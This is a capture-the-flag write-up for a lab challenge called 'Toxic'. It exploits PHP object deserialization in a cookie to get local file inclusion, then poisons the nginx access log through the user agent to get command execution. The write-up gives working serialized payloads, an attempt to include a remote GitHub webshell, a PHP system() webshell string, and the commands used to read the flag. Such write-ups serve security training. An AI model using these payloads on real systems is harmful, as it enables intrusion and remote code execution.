# Toxic

> **Humanity has exploited our allies, the dart frogs, for far too long, take**
> **back the freedom of our lovely poisonous friends. Malicious input is out of**
> **the question when dart frogs meet industrialisation.**

## Cookies!

The page's cookie is a serialize php object:

```bash
echo Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9 | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

It represents the page object meant to be included by `index.php`:

```php
class PageModel
{
    public $file;

    public function __destruct() 
    {
        include($this->file);
    }
}
```

## Object deserialization & LFI

Let's try and include another file:

```php
echo(base64_encode('O:9:"PageModel":1:{s:4:"file";s:30:"/www/static/css/production.css";}'))
```
(for some reason the shell encoding has padding while the php version does not)

> `Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czozMDoiL3d3dy9zdGF0aWMvY3NzL3Byb2R1Y3Rpb24uY3NzIjt9`

After changing the cookie with the dev tools, refreshing actually returns the junk css.

## Fast and failed

Naïvely:

```php
echo(base64_encode('O:9:"PageModel":1:{s:4:"file";s:5:"/flag";}'));
```

This returns an empty page: the flag name is randomized at the start.

The first idea is to include a web url:

```php
echo(base64_encode('O:9:"PageModel":1:{s:4:"file";s:83:"https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/php/cmd.php";}'));
```

But the server is not connected to the internet or at least blocks the php filters:

```php
echo(base64_encode('O:9:"PageModel":1:{s:4:"file";s:11:"php://input}')."\n");
```

Since this previous snippet fails as well.

## Log poisoning

The goal is to find a log file and inject the php code for a web/reverse shell.
Then the LFI bug will give us code execution.

### Finding the log file

#### Enumeration

The LFI can also serve for file enumeration, with a wordlist of base64 encoded path:

```bash
ffuf -b "PHPSESSID=FUZZ" -w paths.b64 -fs 0 -u http://127.0.0.1:1337/
```

#### Wordlist generation

And we can create the wordlist with:

```php
echo(base64_encode(sprintf(
    'O:9:"PageModel":1:{s:4:"file";s:%d:"%s";}',
    strlen($argv[1]),
    $argv[1]
))."\n");
```

And:

```bash
cat /usr/share/wordlists/discovery/log.txt | xargs -I{} -n1 php toxic.php {} > paths.b64
```

#### Results

There are 2 target log files:

> `/var/log/nginx/access.log`
> `/var/log/nginx/error.log`

### Poisoning the log file

Looking at the access log:

```bash
curl -b "PHPSESSID=$(php toxic.php /var/log/nginx/access.log)" \
  -p -x 127.0.0.1:8080 \
  http://127.0.0.1:1337
```

```
172.17.0.1 - 200 "GET / HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" 
172.17.0.1 - 200 "GET /nginx HTTP/1.1" "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
```

The user agent is printed in the file. Let's try and replace it with code:

```bash
curl -A '<?php system(urldecode($_REQUEST['cmd']));?>' http://127.0.0.1:1337
```

### Executing the log file

Accessing the log file with a command as get argument:

```bash
curl -b "PHPSESSID=$(php toxic.php /var/log/nginx/access.log)" -p -x 127.0.0.1:8080 http://127.0.0.1:1337/index.php?cmd=id
```

Returns:

```
...
172.17.0.1 - 200 "GET /index.php?cmd=id HTTP/1.1" "-" "noleak" 
172.17.0.1 - 200 "GET /index.php?cmd=id HTTP/1.1" "-" "uid=1000(www) gid=1000(www) groups=1000(www)
```

Sooooooo, let's search for the flag:

```bash
curl -b "PHPSESSID=$(php toxic.php /var/log/nginx/access.log)" -p -x 127.0.0.1:8080 http://127.0.0.1:1337/index.php?cmd=ls /
```

```
172.17.0.1 - 200 "GET /index.php?cmd=id HTTP/1.1" "-" "bin
dev
entrypoint.sh
etc
flag_3ozfd
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
" 
172.17.0.1 - 408 "GET /index.php?cmd=id HTTP/1.1" "-" ""
```

And:

```bash
curl -b "PHPSESSID=$(php toxic.php /flag_3ozfd)" http://127.0.0.1:1337/index.php
```
